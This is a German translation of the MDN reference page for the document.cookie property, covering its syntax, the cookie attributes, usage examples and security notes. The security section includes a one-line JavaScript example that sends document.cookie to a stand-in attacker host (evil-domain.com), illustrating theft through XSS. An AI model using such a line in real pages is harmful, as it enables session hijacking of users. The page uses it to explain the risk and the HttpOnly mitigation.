---
title: "Dokument: Cookie-Eigenschaft"
short-title: cookie
slug: Web/API/Document/cookie
l10n:
  sourceCommit: be8f7f155a48e11b30c240f8731afb1845f85378
---

{{APIRef("DOM")}}

Die {{domxref("Document")}}-Eigenschaft `cookie` ermöglicht es Ihnen, die mit dem Dokument verbundenen [Cookies](/de/docs/Web/HTTP/Cookies) zu lesen und zu schreiben. Sie dient als Getter und Setter für die tatsächlichen Werte der Cookies.

## Syntax

### Lesen Sie alle von diesem Speicherort zugänglichen Cookies

```js
allCookies = document.cookie;
```

Im obigen Code ist `allCookies` ein String, der eine durch Semikolons getrennte Liste aller Cookies enthält (d.h. `key=value` Paare). Beachten Sie, dass jeder _Schlüssel_ und _Wert_ von Leerzeichen (Leer- und Tabulatortasten) umgeben sein kann: Tatsächlich verlangt {{RFC(6265)}} ein einzelnes Leerzeichen nach jedem Semikolon, aber einige Benutzeragenten halten sich möglicherweise nicht daran.

### Schreiben Sie ein neues Cookie

```js
document.cookie = newCookie;
```

Im obigen Code ist `newCookie` ein String der Form `key=value`, der das zu setzende/aktualisierende Cookie angibt. Beachten Sie, dass Sie mit dieser Methode nur ein Cookie gleichzeitig setzen/aktualisieren können. Berücksichtigen Sie auch, dass:

- Jede der folgenden Cookie-Attributswerte optional dem Schlüssel-Wert-Paar nach einem Semikolon-Trennzeichen folgen kann:

  - `;domain=domain` (z.B., `example.com` oder `subdomain.example.com`): Der Host, an den das Cookie gesendet wird.
    Wenn dies nicht angegeben wird, ist der Standardwert der Hostanteil des aktuellen Dokumentspeicherorts und das Cookie ist auf Subdomains nicht verfügbar.
    Wenn eine Domain angegeben ist, sind Subdomains immer enthalten.
    Entgegen früherer Spezifikationen werden führende Punkte in Domainnamen ignoriert, aber Browser können das Setzen des Cookies mit solchen Punkten ablehnen.

    > [!NOTE]
    > Die Domain _muss_ mit der Domain des JavaScript-Ursprungs übereinstimmen.
    > Das Setzen von Cookies auf fremde Domains wird stillschweigend ignoriert.

  - `;expires=date-in-UTCString-format`: Das Ablaufdatum des Cookies. Wenn weder `expires` noch `max-age` angegeben ist, läuft es am Ende der Sitzung ab.

    > [!WARNING]
    > Wenn der Schutz der Privatsphäre der Benutzer ein Thema ist, ist es wichtig, dass jede Webanwendung die Cookie-Daten nach einem bestimmten Timeout ungültig macht, anstatt darauf zu vertrauen, dass der Browser dies erledigt.
    > Viele Browser erlauben es Benutzern, anzugeben, dass Cookies nie ablaufen sollen, was nicht unbedingt sicher ist.

    Sehen Sie {{jsxref("Date.toUTCString()")}} für Hilfe bei der Formatierung dieses Werts.

  - `;max-age=max-age-in-seconds`: Die maximale Lebensdauer des Cookies in Sekunden (z.B., `60*60*24*365` oder 31536000 für ein Jahr).

  - `;partitioned`: Gibt an, dass das Cookie unter Verwendung einer partitionierten Speicherung gespeichert werden soll. Weitere Einzelheiten finden Sie unter [Cookies Having Independent Partitioned State (CHIPS)](/de/docs/Web/Privacy/Privacy_sandbox/Partitioned_cookies).

  - `;path=path`: Der Wert des `Path`-Attributs des Cookies (Siehe [Define where cookies are sent](/de/docs/Web/HTTP/Cookies#define_where_cookies_are_sent) für weitere Informationen).

  - `;samesite`: Das `SameSite`-Attribut eines {{httpheader("Set-Cookie")}}-Headers kann von einem Server gesetzt werden, um anzugeben, wann das Cookie gesendet wird. Mögliche Werte sind `lax`, `strict` oder `none` (siehe auch [Controlling third-party cookies with `SameSite`](/de/docs/Web/HTTP/Cookies#controlling_third-party_cookies_with_samesite)).

    - Der `lax`-Wert sendet das Cookie für alle Anfragen von derselben Seite und verdeckten Navigations-GET-Anfragen.
      Dies reicht aus, um die Nutzeraktivität zu verfolgen, verhindert jedoch viele [Cross-Site Request Forgery](/de/docs/Glossary/CSRF) (CSRF)-Angriffe.
      Dies ist der Standardwert in modernen Browsern.
    - Der `strict`-Wert verhindert, dass das Cookie vom Browser in allen cross-site-Browsing-Kontexten an die Zielseite gesendet wird, selbst wenn einem regulären Link gefolgt wird.
    - Der `none`-Wert gibt ausdrücklich an, dass keine Einschränkungen gelten.
      Das Cookie wird in allen Anfragen gesendet – sowohl cross-site als auch same-site.

  - `;secure`: Gibt an, dass das Cookie nur über ein sicheres Protokoll übertragen werden soll.

- Der String-Wert des Cookies kann {{jsxref("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} verwenden, um sicherzustellen, dass der String keine Kommas, Semikolons oder Leerzeichen enthält (die in Cookie-Werten nicht zulässig sind).
- Einige Implementationen von Benutzeragenten unterstützen die folgenden Cookie-Präfixe:

  - `__Secure-` Signalisiert dem Browser, dass er das Cookie nur in über einen sicheren Kanal übertragenen Anfragen aufnehmen soll.
  - `__Host-` Signalisiert dem Browser, dass das Cookie neben der Einschränkung, nur von einem sicheren Ursprung verwendet zu werden, im Umfang auf ein vom Server übergebenes Pfad-Attribut begrenzt ist.
    Wenn der Server das Pfad-Attribut weglässt, wird das "Verzeichnis" der Anfrage-URI verwendet.
    Es signalisiert auch, dass das Domain-Attribut nicht vorhanden sein darf, was verhindert, dass das Cookie an andere Domains gesendet wird.
    Für Chrome muss das Pfad-Attribut immer der Ursprung sein.

  > [!NOTE]
  > Der Bindestrich wird als Teil des Präfixes betrachtet.

  > [!NOTE]
  > Diese Flags sind nur mit dem `secure`-Attribut setzbar.

> [!NOTE]
> Wie aus dem obigen Code ersichtlich ist, handelt es sich bei `document.cookie` um eine [Accessor Property](/de/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) mit nativen _Setter_- und _Getter_-Funktionen und ist folglich _nicht_ eine [Daten-Eigenschaft](/de/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) mit einem Wert: Was Sie schreiben, ist nicht dasselbe wie das, was Sie lesen, alles wird immer vom JavaScript-Interpreter vermittelt.

## Beispiele

### Beispiel 1: Einfache Nutzung

```js
// Beachten Sie, dass wir in diesem Beispiel `SameSite=None;` einstellen, da das Beispiel
// in einem Cross-Origin-Kontext funktionieren muss.
// Es ist üblicher, das `SameSite`-Attribut nicht zu setzen, was zum Standardwert
// und sichereren Wert von `SameSite=Lax;` führt.
document.cookie = "name=oeschger; SameSite=None; Secure";
document.cookie = "favorite_food=tripe; SameSite=None; Secure";

function showCookies() {
  const output = document.getElementById("cookies");
  output.textContent = `> ${document.cookie}`;
}

function clearOutputCookies() {
  const output = document.getElementById("cookies");
  output.textContent = "";
}
```

```html
<button onclick="showCookies()">Show cookies</button>

<button onclick="clearOutputCookies()">Clear</button>

<div>
  <code id="cookies"></code>
</div>
```

{{EmbedLiveSample('Example_1_Simple_usage', 200, 72)}}

### Beispiel 2: Ein Beispiel-Cookie namens test2 abrufen

```js
// Beachten Sie, dass wir in diesem Beispiel `SameSite=None;` einstellen, da das Beispiel
// in einem Cross-Origin-Kontext funktionieren muss.
// Es ist üblicher, das `SameSite`-Attribut nicht zu setzen, was zum Standardwert
// und sichereren Wert von `SameSite=Lax;` führt.
document.cookie = "test1=Hello; SameSite=None; Secure";
document.cookie = "test2=World; SameSite=None; Secure";

const cookieValue = document.cookie
  .split("; ")
  .find((row) => row.startsWith("test2="))
  ?.split("=")[1];

function showCookieValue() {
  const output = document.getElementById("cookie-value");
  output.textContent = `> ${cookieValue}`;
}

function clearOutputCookieValue() {
  const output = document.getElementById("cookie-value");
  output.textContent = "";
}
```

```html
<button onclick="showCookieValue()">Show cookie value</button>

<button onclick="clearOutputCookieValue()">Clear</button>

<div>
  <code id="cookie-value"></code>
</div>
```

{{EmbedLiveSample('Example_2_Get_a_sample_cookie_named_test2', 200, 72)}}

### Beispiel 3: Etwas nur einmal ausführen

Um den folgenden Code zu verwenden, ersetzen Sie bitte alle Vorkommen des Wortes
`doSomethingOnlyOnce` (Name des Cookies) durch einen benutzerdefinierten Namen.

```js
function doOnce() {
  if (
    !document.cookie
      .split("; ")
      .find((row) => row.startsWith("doSomethingOnlyOnce"))
  ) {
    // Beachten Sie, dass wir in diesem Beispiel `SameSite=None;` einstellen, da das Beispiel
    // in einem Cross-Origin-Kontext funktionieren muss.
    // Es ist üblicher, das `SameSite`-Attribut nicht zu setzen, was zum Standardwert
    // und sichereren Wert von `SameSite=Lax;` führt.
    document.cookie =
      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";

    const output = document.getElementById("do-once");
    output.textContent = "> Do something here!";
  }
}

function clearOutputDoOnce() {
  const output = document.getElementById("do-once");
  output.textContent = "";
}
```

```html
<button onclick="doOnce()">Only do something once</button>

<button onclick="clearOutputDoOnce()">Clear</button>

<div>
  <code id="do-once"></code>
</div>
```

{{EmbedLiveSample('Example_3_Do_something_only_once', 200, 72)}}

### Beispiel 4: Das vorherige Cookie zurücksetzen

```js
function resetOnce() {
  // Beachten Sie, dass wir in diesem Beispiel `SameSite=None;` einstellen, da das Beispiel
  // in einem Cross-Origin-Kontext funktionieren muss.
  // Es ist üblicher, das `SameSite`-Attribut nicht zu setzen, was zum Standardwert
  // und sichereren Wert von `SameSite=Lax;` führt.
  document.cookie =
    "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure";

  const output = document.getElementById("reset-once");
  output.textContent = "> Reset!";
}

function clearOutputResetOnce() {
  const output = document.getElementById("reset-once");
  output.textContent = "";
}
```

```html
<button onclick="resetOnce()">Reset only once cookie</button>

<button onclick="clearOutputResetOnce()">Clear</button>

<div>
  <code id="reset-once"></code>
</div>
```

{{EmbedLiveSample('Example_4_Reset_the_previous_cookie', 200, 72)}}

### Beispiel 5: Überprüfen, ob ein Cookie existiert

```js
// Beachten Sie, dass wir in diesem Beispiel `SameSite=None;` einstellen, da das Beispiel
// in einem Cross-Origin-Kontext funktionieren muss.
// Es ist üblicher, das `SameSite`-Attribut nicht zu setzen, was zum Standardwert
// und sichereren Wert von `SameSite=Lax;` führt.
document.cookie = "reader=1; SameSite=None; Secure";

function checkACookieExists() {
  if (
    document.cookie.split(";").some((item) => item.trim().startsWith("reader="))
  ) {
    const output = document.getElementById("a-cookie-existence");
    output.textContent = '> The cookie "reader" exists';
  }
}

function clearOutputACookieExists() {
  const output = document.getElementById("a-cookie-existence");
  output.textContent = "";
}
```

```html
<button onclick="checkACookieExists()">Check a cookie exists</button>

<button onclick="clearOutputACookieExists()">Clear</button>

<div>
  <code id="a-cookie-existence"></code>
</div>
```

{{EmbedLiveSample('Example_5_Check_a_cookie_existence', 200, 72)}}

### Beispiel 6: Überprüfen, ob ein Cookie einen bestimmten Wert hat

```js
function checkCookieHasASpecificValue() {
  if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
    const output = document.getElementById("a-specific-value-of-the-cookie");
    output.textContent = '> The cookie "reader" has a value of "1"';
  }
}

function clearASpecificValueOfTheCookie() {
  const output = document.getElementById("a-specific-value-of-the-cookie");
  output.textContent = "";
}
```

```html
<button onclick="checkCookieHasASpecificValue()">
  Check that a cookie has a specific value
</button>

<button onclick="clearASpecificValueOfTheCookie()">Clear</button>

<div>
  <code id="a-specific-value-of-the-cookie"></code>
</div>
```

{{EmbedLiveSample('Example_6_Check_that_a_cookie_has_a_specific_value', 200, 72)}}

## Sicherheit

Es ist wichtig zu beachten, dass das `path`-Attribut _nicht_ vor unbefugtem Lesen des Cookies von einem anderen Pfad schützt. Es kann leicht über das DOM umgangen werden, zum Beispiel durch Erstellen eines versteckten {{HTMLElement("iframe")}}-Elements mit dem Pfad des Cookies und dann Zugriff auf die `contentDocument.cookie`-Eigenschaft dieses iframes. Die einzige Möglichkeit, das Cookie zu schützen, besteht darin, eine andere Domain oder Subdomain zu verwenden, aufgrund der [Same-Origin-Richtlinie](/de/docs/Web/Security/Same-origin_policy).

Cookies werden häufig in Webanwendungen verwendet, um einen Benutzer und seine authentifizierte Sitzung zu identifizieren. Der Diebstahl eines Cookies aus einer Webanwendung führt zur Übernahme der authentifizierten Benutzersitzung. Häufige Methoden zum Stehlen von Cookies umfassen die Verwendung von [Social Engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) oder das Ausnutzen einer [Cross-Site Scripting](/de/docs/Glossary/Cross-site_scripting) (XSS)-Schwachstelle in der Anwendung -

```js
new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
```

Das `HTTPOnly`-Cookie-Attribut kann helfen, diesen Angriff zu mildern, indem der Zugriff auf den Cookie-Wert über JavaScript verhindert wird. Lesen Sie mehr über [Cookies und Sicherheit](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/).

## Anmerkungen

- Ab Firefox 2 steht ein besserer Mechanismus für die clientseitige Speicherung zur Verfügung - [WHATWG DOM Storage](/de/docs/Web/API/Web_Storage_API).
- Sie können ein Cookie löschen, indem Sie seine Ablaufzeit auf null setzen.
- Beachten Sie, dass je mehr Cookies Sie haben, desto mehr Daten zwischen dem Server und dem Client bei jeder Anforderung übertragen werden.
  Dies wird jede Anfrage langsamer machen.
  Es wird dringend empfohlen, [WHATWG DOM Storage](/de/docs/Web/API/Web_Storage_API) zu verwenden, wenn Sie "nur Client"-Daten speichern möchten.
- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965) (Abschnitt 5.3, "Implementation Limits") spezifiziert, dass es **keine maximale Länge** der Schlüssellänge oder Wertgröße eines Cookies geben sollte und ermutigt Implementierungen, **beliebig große Cookies** zu unterstützen.
  Das Implementierungsmaximum jedes Browsers wird zwangsläufig unterschiedlich sein, daher konsultieren Sie die jeweilige Browser-Dokumentation.

Der Grund für die [Syntax](#syntax) der `document.cookie`-Accessor-Eigenschaft liegt in der client-server-Natur von Cookies, die sich von anderen Client-zu-Client-Speichermethoden (wie z.B. [localStorage](/de/docs/Web/API/Web_Storage_API)) unterscheidet:

### Der Server weist den Client an, ein Cookie zu speichern

```bash
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: cookie_name1=cookie_value1
Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT

[Inhalt der Seite hier]
```

### Der Client sendet seine zuvor gespeicherten Cookies an den Server zurück

```bash
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
Accept: */*
```

## Spezifikationen

{{Specifications}}

## Browserkompatibilität

{{Compat}}

## Siehe auch

- [HTTP cookies](/de/docs/Web/HTTP/Cookies)
- [DOM Storage](/de/docs/Web/API/Web_Storage_API)
- [`URL.pathname`](/de/docs/Web/API/URL/pathname)
- {{jsxref("Date.toUTCString()")}}
- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965)
